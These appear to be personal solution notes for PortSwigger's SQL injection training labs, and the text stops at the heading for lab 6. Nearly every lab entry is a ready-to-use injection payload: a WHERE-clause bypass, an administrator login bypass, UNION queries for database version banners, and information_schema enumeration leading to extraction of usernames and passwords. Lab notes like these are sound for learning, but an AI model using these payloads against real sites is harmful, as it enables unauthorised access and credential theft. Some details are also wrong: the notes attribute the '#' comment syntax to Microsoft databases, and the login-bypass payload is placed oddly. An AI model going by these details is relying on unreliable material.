https://portswigger.net/web-security/sql-injection 
https://portswigger.net/web-security/sql-injection/cheat-sheet

## Labs:
## 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

SQL injection attack that causes the application to display one or more unreleased products.

	SELECT * FROM products WHERE category = ' OR 1=1--

```
	.../filter?category= ' OR 1=1--
```

## 2. SQL injection vulnerability allowing login bypass

SQL injection attack that logs in to the application as the `administrator` user.

```
.../my-account?id=administrator'--
```

## 3. SQL injection querying the database type and version on Oracle

 Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 ```
 .../filter?category=Accessories'UNION SELECT'a','b' FROM dual--
```

 Display the database version:
```
 .../filter?category=Accessories'UNION SELECT 'a', banner FROM v$version--
```

## 4. SQL injection attack, querying the database type and version on MySQL and Microsoft

Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

In Microsoft database we can payload without to specify FROM table, instead we can comment with "#" right after selected columns:
 ```
 .../filter?category=Accessories'UNION SELECT'a','b'#
```

 Display the database version:
```
 .../filter?category=Accessories'UNION SELECT 'a', @@version#
 ```

## 5.SQL injection attack, listing the database contents on non-Oracle databases

Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
```
' UNION SELECT 'abc','def'--
```

Retrieve the list of tables in the database and find the name of the table containing user credentials
```
' UNION SELECT table_name, null FROM information_schema.tables--
```

Replacing the table name to retrieve the details of the columns in the table:
```
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_abcdef'--
```
\
Replacing the table and column names to retrieve the usernames and passwords for all users:
```
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```

## 6.SQL injection attack, listing the database contents on Oracle
